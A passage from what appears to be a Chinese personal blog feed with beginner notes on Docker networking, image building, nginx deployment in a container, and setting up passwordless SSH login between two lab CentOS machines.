no</code></pre><p>发现新增了一个网桥，这个网桥就是我们刚刚创建好的网络，可以发现网桥的名字就是刚刚创建的网络的短ID。</p><p>既然是我们自己创建的网络那么就可以自定义这个网络，接着重新创建一个网络并自定义这个网络的网段和网关。</p><pre><code>[root@promote ~]# docker network create --driver bridge --subnet 192.168.1.0/24 --gateway 192.168.1.1 new2_net44b6f73a2cd3fd0d5d17124ddb87c5f3dfca1a8ca2c90af1570b1dd4eaa71d67[root@promote ~]# docker network lsNETWORK ID          NAME                DRIVER              SCOPEb6a32ec430e9        bridge              bridge              local9ab80c94885b        host                host                local44b6f73a2cd3        new2_net            bridge              local8f0d50950bb7        new_net             bridge              localc42335728d98        none                null                local</code></pre><p>使用<code>docker inspect</code>可以看到<code>new2_net</code>网段的详细信息，可以注意到网段和网关都是我们自定义的。</p><pre><code>[root@promote ~]# docker network inspect new2_net[    {        &quot;Name&quot;: &quot;new2_net&quot;,        &quot;Id&quot;: &quot;44b6f73a2cd3fd0d5d17124ddb87c5f3dfca1a8ca2c90af1570b1dd4eaa71d67&quot;,        &quot;Created&quot;: &quot;2018-07-10T01:56:21.418800602-04:00&quot;,        &quot;Scope&quot;: &quot;local&quot;,        &quot;Driver&quot;: &quot;bridge&quot;,        &quot;EnableIPv6&quot;: false,        &quot;IPAM&quot;: {            &quot;Driver&quot;: &quot;default&quot;,            &quot;Options&quot;: {},            &quot;Config&quot;: [                {                    &quot;Subnet&quot;: &quot;192.168.1.0/24&quot;,                    &quot;Gateway&quot;: &quot;192.168.1.1&quot;                }            ]        },        &quot;Internal&quot;: false,        &quot;Attachable&quot;: false,        &quot;Containers&quot;: {},        &quot;Options&quot;: {},        &quot;Labels&quot;: {}    }]</code></pre><p>再查看一下网桥</p><pre><code>[root@promote ~]# brctl showbridge name     bridge id               STP enabled     interfacesbr-44b6f73a2cd3         8000.02421dea9d8a       nobr-8f0d50950bb7         8000.024233fc2bd6       nodocker0         8000.0242f338d5bb       no[root@promote ~]# ifconfig br-44b6f73a2cd3br-44b6f73a2cd3: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500        inet 192.168.1.1  netmask 255.255.255.0  broadcast 0.0.0.0        ether 02:42:1d:ea:9d:8a  txqueuelen 0  (Ethernet)        RX packets 0  bytes 0 (0.0 B)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 0  bytes 0 (0.0 B)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</code></pre><p>可以发现网桥上的IP就是刚刚创建的网络的网关。</p><p>接下来就是使用自己创建的网络，使用<code>--network</code>选项即可。</p><pre><code>[root@promote ~]# docker run -it --name busybox --network new2_net docker.io/busybox/ # ifconfigeth0      Link encap:Ethernet  HWaddr 02:42:C0:A8:01:02        inet addr:192.168.1.2  Bcast:0.0.0.0  Mask:255.255.255.0        inet6 addr: fe80::42:c0ff:fea8:102/64 Scope:Link        UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1        RX packets:14 errors:0 dropped:0 overruns:0 frame:0        TX packets:7 errors:0 dropped:0 overruns:0 carrier:0        collisions:0 txqueuelen:0        RX bytes:1156 (1.1 KiB)  TX bytes:578 (578.0 B)lo        Link encap:Local Loopback        inet addr:127.0.0.1  Mask:255.0.0.0        inet6 addr: ::1/128 Scope:Host        UP LOOPBACK RUNNING  MTU:65536  Metric:1        RX packets:0 errors:0 dropped:0 overruns:0 frame:0        TX packets:0 errors:0 dropped:0 overruns:0 carrier:0        collisions:0 txqueuelen:1000        RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</code></pre><p>可以看到这个容器的IP地址就是我刚刚创建的网络分配的。当然，这个IP地址还可以自己设置静态IP，当然不能设置为<code>new2_net</code>网络网段之外的IP，否则会报错。<br>使用<code>--ip</code>选项就可以了。</p><pre><code>[root@promote ~]# docker run -it --name busybox --network new2_net --ip 192.168.1.5 docker.io/busybox/ # ifconfigeth0      Link encap:Ethernet  HWaddr 02:42:C0:A8:01:05        inet addr:192.168.1.5  Bcast:0.0.0.0  Mask:255.255.255.0        inet6 addr: fe80::42:c0ff:fea8:105/64 Scope:Link        UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1        RX packets:7 errors:0 dropped:0 overruns:0 frame:0        TX packets:7 errors:0 dropped:0 overruns:0 carrier:0        collisions:0 txqueuelen:0        RX bytes:578 (578.0 B)  TX bytes:578 (578.0 B)lo        Link encap:Local Loopback        inet addr:127.0.0.1  Mask:255.0.0.0        inet6 addr: ::1/128 Scope:Host        UP LOOPBACK RUNNING  MTU:65536  Metric:1        RX packets:0 errors:0 dropped:0 overruns:0 frame:0        TX packets:0 errors:0 dropped:0 overruns:0 carrier:0        collisions:0 txqueuelen:1000        RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</code></pre><p>可以看到Ip为自己设置的静态IP。</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker容器技术学习与分享07</title>
      <link href="/2018/07/16/docker07/"/>
      <url>/2018/07/16/docker07/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker容器网络"><a href="#Docker容器网络" class="headerlink" title="Docker容器网络"></a>Docker容器网络</h1><p>在分享06中学完了<code>bridge网络</code>，接着学习<code>none网络</code>和<code>host网络</code>。<br>Docker在安装时会在host上默认创建三个网络，分别是<code>bridge</code>、<code>host</code>、<code>null</code>。</p><pre><code>[root@promote ~]# docker network lsNETWORK ID          NAME                DRIVER              SCOPE527281654b19        bridge              bridge              local9ab80c94885b        host                host                localc42335728d98        none                null                local</code></pre><p>##none网络<br>none网络就是什么网络都没有，就和一台没有联网的PC一样，可以在创建容器时通过<code>--network=none</code>指定。</p><pre><code>[root@promote ~]# docker run -it --name busybox --network none docker.io/busybox/ # ifconfiglo        Link encap:Local Loopback          inet addr:127.0.0.1  Mask:255.0.0.0          inet6 addr: ::1/128 Scope:Host          UP LOOPBACK RUNNING  MTU:65536  Metric:1          RX packets:0 errors:0 dropped:0 overruns:0 frame:0          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</code></pre><p>创建完成后查看网络，发现只有一个回环设备，没有网卡设备（这里用的镜像是<code>busybox</code>，因为busybox包含了一些像<code>ifconfig</code>简单的命令，一开始我用的是<code>centos</code>镜像，后来发现<code>centos</code>镜像没有<code>ifconfig</code>命令，需要安装，而我创建的是无网络环境，所以就换成了<code>busybox</code>）。</p><p>##host网络<br>host网络就是连接host网络的容器与主机共享网络，且网络配置一致。</p><pre><code>[root@promote ~]# docker run -it --name busybox --network host docker.io/busybox/ # ifconfigdocker0   Link encap:Ethernet  HWaddr 02:42:80:4B:97:72          inet addr:172.17.0.1  Bcast:0.0.0.0  Mask:255.255.0.0          UP BROADCAST MULTICAST  MTU:1500  Metric:1          RX packets:0 errors:0 dropped:0 overruns:0 frame:0          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)ens33     Link encap:Ethernet  HWaddr 00:0C:29:EB:2D:01          inet addr:192.168.41.133  Bcast:192.168.41.255  Mask:255.255.255.0          inet6 addr: fe80::4881:9be0:2bb6:62e/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:586 errors:0 dropped:0 overruns:0 frame:0          TX packets:410 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000          RX bytes:51651 (50.4 KiB)  TX bytes:46089 (45.0 KiB)lo        Link encap:Local Loopback          inet addr:127.0.0.1  Mask:255.0.0.0          inet6 addr: ::1/128 Scope:Host          UP LOOPBACK RUNNING  MTU:65536  Metric:1          RX packets:68 errors:0 dropped:0 overruns:0 frame:0          TX packets:68 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000          RX bytes:6044 (5.9 KiB)  TX bytes:6044 (5.9 KiB)</code></pre><p>再来看一下主机的网络。</p><pre><code>[root@promote ~]# ifconfigdocker0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500         inet 172.17.0.1  netmask 255.255.0.0  broadcast 0.0.0.0         ether 02:42:80:4b:97:72  txqueuelen 0  (Ethernet)         RX packets 0  bytes 0 (0.0 B)         RX errors 0  dropped 0  overruns 0  frame 0         TX packets 0  bytes 0 (0.0 B)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 192.168.41.133  netmask 255.255.255.0  broadcast 192.168.41.255        inet6 fe80::4881:9be0:2bb6:62e  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:0c:29:eb:2d:01  txqueuelen 1000  (Ethernet)        RX packets 619  bytes 54111 (52.8 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 431  bytes 48129 (47.0 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1000  (Local Loopback)        RX packets 68  bytes 6044 (5.9 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 68  bytes 6044 (5.9 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</code></pre><p>可以发现他们是一致的。</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker容器技术学习与分享06</title>
      <link href="/2018/06/11/docker06/"/>
      <url>/2018/06/11/docker06/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker容器网络"><a href="#Docker容器网络" class="headerlink" title="Docker容器网络"></a>Docker容器网络</h1><p>Docker有三种原生网络：<code>none网络</code>、<code>host网络</code>、<code>bridge网络</code>。<br>先来学习一下<code>bridge网络</code>。<br>首先使用<code>ifconfig</code>命令查看一下本机的网络设备：<br><img alt data-src="https://image.3001.net/images/20181123/15429705235975.jpg" class="lozad"><br>从图中可以看见多出一个名为<code>docker0</code>的设备，这个<code>docker0</code>就是linux的虚拟网桥，docker的守护进程就是通过这个名为<code>docker0</code>的设备为docker容器提供网络连接的各种服务。<br>虚拟网桥：可以设置IP地址，相当于一个虚拟网卡，可以用于连接多个端口，可以构建一个局域网，可以简单的理解为二层的交换机，但两者并不等同。<br>Docker容器守护进程在容器启动时会自动创建连接网络的两端，一端是在容器中的网络设备，另一端时在docker运行的主机上创建一个名为<code>veth*</code>的接口用来实现<code>docker0</code>与容器的网络通信。<br><img alt data-src="https://image.3001.net/images/20181123/1542970525603.jpg" class="lozad"><br>接下来来看一下docker中的网桥管理。<br>首先需要安装网桥管理工具<code>bridge-utils</code>：<br><img alt data-src="https://image.3001.net/images/20181123/15429705275854.jpg" class="lozad"><br>安装完成之后来查看一下网桥设备：<br><img alt data-src="https://image.3001.net/images/20181123/15429705283314.jpg" class="lozad"><br>可以看到默认的虚拟网桥<code>docker0</code>，现在创建一个centos容器：<br>启动完容器发现<code>ifconfig</code>命令没有用，是因为<code>ifconfig</code>命令需要安装<code>net-tools</code>工具包。<br><img alt data-src="https://image.3001.net/images/20181123/1542970530365.jpg" class="lozad"><br>安装<code>net-tools</code>工具包之后就可以使用<code>ifconfig</code>命令了，来查看一下容器的网络设备：<br><img alt data-src="https://image.3001.net/images/20181123/15429705326207.jpg" class="lozad"><br>可以看到这里有个<code>eth0</code>，这就是容器创建时docker守护进程分配给容器的网络接口，用来连接docker0的，使容器在后台运行<code>ctrl+P+Q</code>，然后查看一下docker0上的情况。<br><img alt data-src="https://image.3001.net/images/20181123/15429705342758.jpg" class="lozad"><br>可以看到interfaces（接口）下面多出了一个<code>veth149ef6</code>，这就是centos容器<code>eth0</code>的对端设备，用来将centos容器和docker0虚拟网桥进行通信的网络接口设备：<br><img alt data-src="https://image.3001.net/images/20181123/15429705369907.jpg" class="lozad"><br>通过查看本机的网络设备也可以看到：<br><img alt data-src="https://image.3001.net/images/20181123/15429705387232.jpg" class="lozad"><br>观察一下可以发现，容器的ip是由docker0虚拟网桥分配的：<br><img alt data-src="https://image.3001.net/images/20181123/1542970540700.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/1542970542605.jpg" class="lozad"><br>那么是不是可以更改网桥的ip呢？当然是可以的。<br><img alt data-src="https://image.3001.net/images/20181123/15429705441024.jpg" class="lozad"><br>通过<code>ifconfig docker0 192.168.1.1 netmask 255.255.255.0</code>命令将docker0的ip地址更改为了<code>192.168.1.1</code>，来验证一下：<br><img alt data-src="https://image.3001.net/images/20181123/15429705467087.jpg" class="lozad"><br>但是这是临时修改，重启docker服务之后ip地址就会变回去。<br>这时再启动容器就会发现容器的IP变为<code>192.168.1.0</code>网段。</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-SSH免密登陆</title>
      <link href="/2018/06/09/SSH%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/"/>
      <url>/2018/06/09/SSH%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p><strong>SSH远程免密登录</strong><br>环境：两台centos虚拟机，一台为<code>192.168.134.129</code>（用作远程主机），另一台为<code>192.168.134.130</code>.</p><p>首先查看一下两台linux的ip地址：</p><pre><code>[root@promote ~]# ifconfigens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 192.168.134.129  netmask 255.255.255.0  broadcast 192.168.134.255        inet6 fe80::4881:9be0:2bb6:62e  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:0c:29:eb:2d:01  txqueuelen 1000  (Ethernet)        RX packets 145  bytes 18326 (17.8 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 144  bytes 23724 (23.1 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1000  (Local Loopback)        RX packets 64  bytes 5696 (5.5 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 64  bytes 5696 (5.5 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</code></pre><p>再来看一下另外一台：</p><pre><code>[root@machine1 ~]# ifconfigens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 192.168.134.130  netmask 255.255.255.0  broadcast 192.168.134.255        inet6 fe80::4881:9be0:2bb6:62e  prefixlen 64  scopeid 0x20&lt;link&gt;        inet6 fe80::134a:dd7d:6b15:96ea  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:0c:29:42:f7:1d  txqueuelen 1000  (Ethernet)        RX packets 127  bytes 15748 (15.3 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 134  bytes 21258 (20.7 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1000  (Local Loopback)        RX packets 64  bytes 5696 (5.5 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 64  bytes 5696 (5.5 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</code></pre><p>先在<code>192.168.134.130</code>上远程登录<code>192.168.134.129</code>试试。</p><pre><code>[root@machine1 ~]# ssh 192.168.134.129The authenticity of host &apos;192.168.134.129 (192.168.134.129)&apos; can&apos;t be established.ECDSA key fingerprint is SHA256:JqAC8jcLCLobvRy0wzY9VGBNuZU3EydpO8n2fEtQ178.ECDSA key fingerprint is MD5:5d:26:a1:60:c3:eb:02:e9:97:7a:bb:7a:49:8a:14:0b.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added &apos;192.168.134.129&apos; (ECDSA) to the list of known hosts.root@192.168.134.129&apos;s password:</code></pre><p>发现是要输入密码才可以登录的。<br>现在来实现免密登陆。<br>首先在<code>192.168.134.130</code>上生成公钥。</p><pre><code>[root@machine1 ~]# ssh-keygenGenerating public/private rsa key pair.Enter file in which to save the key (/root/.ssh/id_rsa):Enter passphrase (empty for no passphrase):Enter same passphrase again:Your identification has been saved in /root/.ssh/id_rsa.Your public key has been saved in /root/.ssh/id_rsa.pub.The key fingerprint is:SHA256:pRHW15F3aA7esrPe39CEchPqzPCKAIKd/+4liaigyzo root@machine1The key&apos;s randomart image is:+---[RSA 2048]----+|        o.   ..+ ||       . .. o = o||        . .o =...|| o .     +  o.oo ||. + .   S . oo+ .||   + o .   *oo + ||. . o + .   =o. .||E.   . + . ... ..||*+   o+ . ... ..o|+----[SHA256]-----+</code></pre><p>接着将此公钥发送到远程主机<code>192.168.134.129</code>。</p><pre><code>[root@machine1 ~]# ssh-copy-id 192.168.134.129/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: &quot;/root/.ssh/id_rsa.pub&quot;/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keysroot@192.168.134.129&apos;s password:Number of key(s) added: 1Now try logging into the machine, with:   &quot;ssh &apos;192.168.134.129&apos;&quot;and check to make sure that only the key(s) you wanted were added.</code></pre><p>传送完成之后，到远程主机<code>192.168.134.129</code>上修改ssh的配置文件<code>/etc/ssh/sshd_config</code>.<br>修改以下两条：<code>PubkeyAuthentication yes</code>和<code>PasswordAuthentication no</code>,即密钥登陆改为yes，密码登陆改为no.<br><img alt data-src="https://image.3001.net/images/20181123/15429746437484.jpg" class="lozad"><br>接着重启一下<code>sshd</code>服务</p><pre><code>[root@machine1 ~]# systemctl restart sshd</code></pre><p>然后到<code>192.168.134.130</code>上远程免密登录<code>192.168.134.129</code>试试。</p><pre><code>[root@machine1 ~]# ssh 192.168.134.129Last login: Thu Jul 12 00:01:07 2018 from 192.168.134.1[root@promote ~]# ifconfigens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 192.168.134.129  netmask 255.255.255.0  broadcast 192.168.134.255        inet6 fe80::4881:9be0:2bb6:62e  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:0c:29:eb:2d:01  txqueuelen 1000  (Ethernet)        RX packets 1927  bytes 207095 (202.2 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 1693  bytes 174581 (170.4 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1000  (Local Loopback)        RX packets 64  bytes 5696 (5.5 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 64  bytes 5696 (5.5 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</code></pre><p>免密登录成功！</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker容器技术学习与分享05</title>
      <link href="/2018/06/08/docker05/"/>
      <url>/2018/06/08/docker05/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker镜像操作"><a href="#Docker镜像操作" class="headerlink" title="Docker镜像操作"></a>Docker镜像操作</h1><p>学完了一些最基本的操作之后，我学习了一些关于docker镜像的基本操作。<br>首先来学习一下从<code>docker hub</code>上拉取镜像，以<code>centos</code>镜像为例，使用<code>docker search</code>命令搜索镜像：<br><img alt data-src="https://image.3001.net/images/20181123/15429701409686.jpg" class="lozad"><br>从图上可以看见在<code>docker hub</code>搜索到很多镜像，接着学习镜像的拉取，使用<code>docker pull</code>命令将镜像从<code>docker hub</code>拉取到本地：<br><img alt data-src="https://image.3001.net/images/20181123/15429701634593.jpg" class="lozad"><br>这样就可以通过<code>docker images</code>命令来查看本地的镜像：<br><img alt data-src="https://image.3001.net/images/20181123/15429701926748.jpg" class="lozad"><br>而下载到本地的镜像存放在<code>/var/lib/docker/overlay2</code>：<br><img alt data-src="https://image.3001.net/images/20181123/15429702082096.jpg" class="lozad"><br>第一行就是下载的<code>centos</code>镜像在本地的文件。<br>学会了下载镜像，然后学习了删除镜像，删除镜像使用<code>docker rmi</code>命令：<br><img alt data-src="https://image.3001.net/images/20181123/15429702331794.jpg" class="lozad"><br>删除时可以使用镜像的名字也可以使用镜像的ID。<br>接着学习如何构建镜像，构建镜像有以下两种方法：<code>docker commit</code>命令和<code>dockerfile</code>，先来学习用<code>docker commit</code>命令构建镜像。<br><code>docker commit</code>命令一般用于将修改过后的镜像提交为一个新的镜像，首先使用centos镜像起一个容器，接着对容器进行更改，然后使用<code>docker commit</code>命令构建新的镜像，接着用这个修改过的容器构建新的镜像：<br><img alt data-src="https://image.3001.net/images/20181123/15429702541257.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429702677386.jpg" class="lozad"><br><code>docker commit</code>命令的语法是这样的<code>docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]</code>。<br><code>OPTIONS</code>有如下几个选择：</p><ul><li><p>-a :提交的镜像作者名字。</p></li><li><p>-c :使用Dockerfile指令来创建镜像。</p></li><li><p>-m :提交时的说明文字。</p></li><li><p>-p :在commit时，将容器暂停。<br>构建完成镜像之后，来试一下构建好的镜像是不是能用：<br><img alt data-src="https://image.3001.net/images/20181123/15429702832858.jpg" class="lozad"><br>可以看到刚刚构建的镜像可以用。<br>接下来是使用<code>Dockerfile</code>构建镜像：<br><img alt data-src="https://image.3001.net/images/20181123/15429703386867.jpg" class="lozad"><br>首先建立一个空的docker文件夹，然后再docker文件夹里面新建一个Dockerfile文件（注意：这里的文件名字只能用dockerfile命名）<br><img alt data-src="https://image.3001.net/images/20181123/15429703546207.jpg" class="lozad"><br>创建完成之后执行以下操作，(注意：构建操作只能在和Dockerfile同级目录下执行)：<br><img alt data-src="https://image.3001.net/images/20181123/15429703859541.jpg" class="lozad"><br>构建完成之后可以使用<code>docker images</code>命令查看：<br><img alt data-src="https://image.3001.net/images/20181123/15429704052136.jpg" class="lozad"><br>这里就可以看到刚刚构建的名为centos的镜像了。<br>现在以这个镜像为模板运行容器：<br><img alt data-src="https://image.3001.net/images/20181123/15429704184437.jpg" class="lozad">可以看到这里启动容器之后默认运行了我刚刚写在<code>Dockerfile</code>中<code>CMD</code>里面的命令，总结一下<code>Dockerfile</code>中需要使用的命令。</p></li><li><p>FROM指令<br>DockerFile第一条必须为FROM指令。如果同一个DockerFile创建多个镜像时，可使用多个FROM指令。</p></li><li><p>MAINTAINER<br>指定维护者的信息。</p></li><li><p>RUN<br>每条RUN指令将在当前镜像基础上执行指定命令，并提交为新的镜像，因为镜像是分层的</p></li><li><p>CMD<br>CMD的目的是为了在启动容器时提供一个默认的命令执行选项。如果用户启动容器时指定了运行的命令，则会覆盖掉CMD指定的命令。</p></li><li><p>EXPOSE<br>Docker 容器对外映射的端口，需要在 docker run 的时候使用-p或者-P选项生效。</p></li><li><p>ENV<br>指定一个环境变量，会被后面的RUN指令使用。</p></li><li><p>ADD<br>ADD复制本地主机文件、目录或者远程文件URLS添加到容器指定路径中，ADD命令会在复制时解压压缩文件。</p></li><li><p>COPY<br>COPY复制新文件或者目录从 并且添加到容器指定路径中，不能添加远程文件的URLS。</p></li><li><p>VOLUME<br>创建一个可以从本地主机或其他容器挂载的挂载点。</p></li><li><p>WORKDIR<br>为后续的RUN命令指定工作目录<br>这样就知道了如何构建镜像。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker容器技术学习与分享04</title>
      <link href="/2018/06/06/docker04/"/>
      <url>/2018/06/06/docker04/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker创建容器"><a href="#Docker创建容器" class="headerlink" title="Docker创建容器"></a>Docker创建容器</h1><p>基于docker分享03的centos容器，接着学习docker容器的基本操作。<br>docker分享03中创建了一个centos镜像，如果想要查看容器的具体信息就要使用<code>docker inspect</code>命令：<br><img alt data-src="https://image.3001.net/images/20181123/15429696601214.jpg" class="lozad"><br>这样就可以看到这个容器的详细信息了。<br>接着查看这个容器的ip地址，第一种办法，在容器内查看ip：<br><img alt data-src="https://image.3001.net/images/20181123/1542969663226.jpg" class="lozad"><br>第二种方法通过<code>docker inspect</code>查看ip地址：<br><img alt data-src="https://image.3001.net/images/20181123/15429696655386.jpg" class="lozad"></p><p>学会这些最基础的操作后，我就试着用容器来部署nginx服务。<br><img alt data-src="https://image.3001.net/images/20181123/15429696677658.jpg" class="lozad"><br>新创建一个centos容器，将容器的80端口映射到本机的65530端口，接着进入容器：<br><img alt data-src="https://image.3001.net/images/20181123/15429696697355.jpg" class="lozad"><br>安装的时候发现找不到nginx的安装包，这是因为nginx位于第三方源里面不在官方源里面，所以执行以下操作：<br><img alt data-src="https://image.3001.net/images/20181123/15429696716343.jpg" class="lozad"><br>这样就可以开始安装nginx了。<br><img alt data-src="https://image.3001.net/images/20181123/15429696734832.jpg" class="lozad"><br>等待安装完成。<br>安装完成之后新建一个存放网站的目录并编辑一个静态页面：<br><img alt data-src="https://image.3001.net/images/20181123/15429696756999.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429696771254.jpg" class="lozad"><br>接着编辑nginx的配置文件<br><img alt data-src="https://image.3001.net/images/20181123/15429696808752.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429696825686.jpg" class="lozad"><br>将红色的部分改成刚刚创建的目录。<br><img alt data-src="https://image.3001.net/images/20181123/15429696854954.jpg" class="lozad"><br>运行nginx服务，运行之后可以用ps命令查看nginx服务已经在运行。<br>接着按<code>Ctrl+P+Q</code>让centos容器在后台运行<br>然后通过<code>curl</code>命令来查看网页：<br><img alt data-src="https://image.3001.net/images/20181123/15429696887391.jpg" class="lozad"><br>可以看到获取页面成功，除了通过本机的ip获取网页外，还可以通过容器的ip地址来获取网页，首先先查看一下容器的ip地址：<br><img alt data-src="https://image.3001.net/images/20181123/15429696904124.jpg" class="lozad"><br>获取到ip之后就可以通过ip来获取页面了，由于是置界用的容器ip所以不需要加端口，默认使用80端口：<br><img alt data-src="https://image.3001.net/images/20181123/15429696922231.jpg" class="lozad"><br>获取成功！<br>这样就成功的在容器中建立了一个静态网页服务！</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker容器技术学习与分享03</title>
      <link href="/2018/06/04/docker03/"/>
      <url>/2018/06/04/docker03/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker容器的基本操作"><a href="#Docker容器的基本操作" class="headerlink" title="Docker容器的基本操作"></a>Docker容器的基本操作</h1><p>所有的docker命令都是以docker开头，也就是指调用docker程序。我学习的第一个命令就是<code>docker run</code>，运行一个容器。以Docker分享02中的容器为例：<br><img alt data-src="https://image.3001.net/images/20181123/1542966101725.jpg" class="lozad"><br>这样就成功的运行了一个容器，<code>docker run</code> 后面跟着的<code>-i -t</code>表示为这个容器分配一个交互式界面，如果只是运行了<code>docker run docker.io/centos</code>,那么centos将不会给你返回一个容器的交互式页面：<br><img alt data-src="https://image.3001.net/images/20181123/15429661032541.jpg" class="lozad"><br>如果想让容器在后台运行那么可以执行<code>docker run -d docker.io/centos</code>。</p><p>docker run 常用的选项有下面几种：<br><code>-i</code>让容器的标准输入保持打开。<br><code>-t</code>让Docker分配一个伪终端并绑定到容器的标准输入上。<br><code>-d</code>让容器保持在后台运行<br><code>--name</code>为容器自定义名字，形式为<code>docker run --name centos docker.io/centos</code>.</p><p>到这里就知道了如何在centos上运行一个容器，接下来学习了如何使一个正在运行的容器停止一个容器，在此之前先来学习一下怎么查看正在运行的容器，查看当前正在运行的容器使用  docker ps  命令：<br><img alt data-src="https://image.3001.net/images/20181123/15429661056644.jpg" class="lozad"><br>发现之前使用<code>docker run docker.io/centos</code>创建的容器竟然没有在运行，再使用<code>docker ps -a</code>查看所有正在运行的容器：<br><img alt data-src="https://image.3001.net/images/20181123/15429661071241.jpg" class="lozad"><br>这时发现之前运行的容器是<code>Exited</code>状态，那么重新创建一个运行的容器：<br><img alt data-src="https://image.3001.net/images/20181123/15429661084070.jpg" class="lozad"><br>这样就创建了一个在后台运行的名为centos的容器，来验证一下:<br><img alt data-src="https://image.3001.net/images/20181123/15429661114214.jpg" class="lozad"><br>可以看到创建成功了，接下来停止运行这个容器，使用<code>docker stop centos</code>.<br><img alt data-src="https://image.3001.net/images/20181123/15429661133548.jpg" class="lozad"><br>那么怎么再次重新运行这个退出的容器呢？<br><img alt data-src="https://image.3001.net/images/20181123/15429661158370.jpg" class="lozad"><br>这样就重新将停止运行的容器重新运行了。<br>使用<code>docker attach</code>命令进入正在后台运行的容器。<br><img alt data-src="https://image.3001.net/images/20181123/15429661172452.jpg" 